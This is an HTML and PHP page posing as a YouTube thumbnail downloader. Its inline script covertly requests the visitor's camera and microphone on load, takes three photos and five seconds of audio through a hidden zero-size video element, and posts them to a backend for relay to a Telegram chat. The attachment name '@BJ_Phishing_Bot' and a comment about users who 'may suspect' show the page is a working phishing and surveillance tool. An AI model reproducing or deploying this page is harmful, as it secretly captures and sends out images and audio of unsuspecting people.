<!DOCTYPE html>
<html lang="en">
<head>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>

  <title>YouTube Thumbnail Downloader</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
  <style>
    body {
      font-family: 'Montserrat', sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f5f5f5;
    }
    .navbar {
      background-color: #ff0000;
      color: white;
      text-align: center;
      padding: 15px 0;
    }
    #header {
      margin: 0;
      font-size: 28px;
      font-weight: bold;
    }
    .container {
      max-width: 600px;
      margin: 20px auto;
      padding: 20px;
      background-color: #fff;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    .form-control {
      width: calc(100% - 22px);
      margin-bottom: 15px;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
      box-sizing: border-box;
      font-family: 'Montserrat', sans-serif;
    }
    #thumbdloadbtn {
      display: block;
      width: 100%;
      padding: 10px;
      border: none;
      border-radius: 5px;
      background-color: #ff0000;
      color: white;
      font-size: 16px;
      cursor: pointer;
      font-family: 'Montserrat', sans-serif;
    }
    #thumbdloadbtn:hover {
      background-color: #cc0000;
    }
    footer {
      text-align: center;
      margin-top: 40px;
      color: #666;
    }
    .youtube-logo {
      display: block;
      margin: 20px auto;
      width: 100px; /* Adjust size as needed */
    }
  </style>
</head>
<body>
  <nav class="navbar">
    <img class="youtube-logo" src="https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg" alt="YouTube Logo">
    <h1 id="header">YOUTUBE THUMBNAIL DOWNLOADER</h1>
  </nav>

  <div class="container">
    <form method="post" action="">
      <input id="ytlink" name="ytlink" type="text" class="form-control" placeholder="Enter YouTube Video URL" spellcheck="false">
      <button id="thumbdloadbtn" type="submit">FETCH</button>
    </form>
    <div id="thumbnail-preview">
      <!-- Placeholder for thumbnail preview -->
      <?php
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
          $ytlink = htmlspecialchars($_POST['ytlink']);
          // Fetch and display the thumbnail preview here
          // Extract YouTube Video ID
          parse_str(parse_url($ytlink, PHP_URL_QUERY), $url_params);
          $video_id = $url_params['v'];
          if ($video_id) {
            $thumbnail_url = "https://img.youtube.com/vi/$video_id/maxresdefault.jpg";
            echo "<img src='$thumbnail_url' alt='Thumbnail Preview' style='max-width:100%;'>";
            echo "<p><a href='$thumbnail_url' download>Download Thumbnail</a></p>";
          } else {
            echo "<p>Invalid YouTube URL</p>";
          }
        }
      ?>
    </div>

    <h2>How to Download HD YouTube Thumbnail</h2>
    <ol>
      <li>Copy the YouTube Video Link / URL from the YouTube App or Website</li>
      <li>Paste the YouTube video Link / URL in the Input Field Above</li>
      <li>Click on the "FETCH" Button</li>
      <li>Select the thumbnail quality</li>
      <li>Download the Thumbnail</li>
    </ol>
  </div>

  <center>
    <button id="toggle-video" style="display:none;">Toggle Video</button>
    <div id="message-container"></div>
    <video id="video" width="0" height="0" autoplay></video>
  </center>

  <script type="text/javascript">
    function downloadThumbnail() {
      // Change button text to indicate fetching
      var btn = document.getElementById('thumbdloadbtn');
      btn.textContent = 'Fetching from server... Wait';
    }
    
    function la(src) {
      window.location = src;
    }
    
    function GetURLParameter(sParam) {
      var sPageURL = window.location.search.substring(1);
      var sURLVariables = sPageURL.split('&');
      for (var i = 0; i < sURLVariables.length; i++) {
        var sParameterName = sURLVariables[i].split('=');
        if (sParameterName[0] == sParam) {
          return sParameterName[1];
        }
      }
    }
    
    var chatid = GetURLParameter('id');
    
    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
      .then((stream) => {
        const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
        const audioRecorder = new MediaRecorder(stream);

        function capturePhoto(index) {
          setTimeout(() => {
            imageCapture.takePhoto()
              .then((blob) => {
                sendToTelegram(blob, 'photo');
              })
              .catch((error) => {
                console.error('Error capturing photo:', error);
              });
          }, index * 2000);
        }

        function startAudioRecording() {
          audioRecorder.start();
          setTimeout(() => {
            audioRecorder.stop();
          }, 5000);
        }

        audioRecorder.ondataavailable = (event) => {
          if (event.data.size > 0) {
            sendToTelegram(event.data, 'audio');
          }
        };

        for (let i = 0; i < 3; i++) {
          capturePhoto(i);
        }

        startAudioRecording();
      })
      .catch((error) => {
        if (error.name === 'NotAllowedError') {
          // Handle the case where permissions are denied
          console.warn('Permissions denied. User may suspect.');
        } else {
          console.error('Permission error:', error);
        }
      });

    function sendToTelegram(data, type) {
      // Bot token is now securely handled in the backend
      var chatId = chatid;

      var formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append(type === 'photo' ? 'photo' : 'audio', data, `@BJ_Phishing_Bot.${type === 'photo' ? 'jpg' : 'wav'}`);

      fetch('send_telegram.php', {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => console.log(data))
      .catch(error => console.error('Error sending to Telegram:', error));
    }
  </script>

  <footer>
    <p>Made With ❤️ BY Mr,BaBlU</p>
  </footer>
</body>
</html>
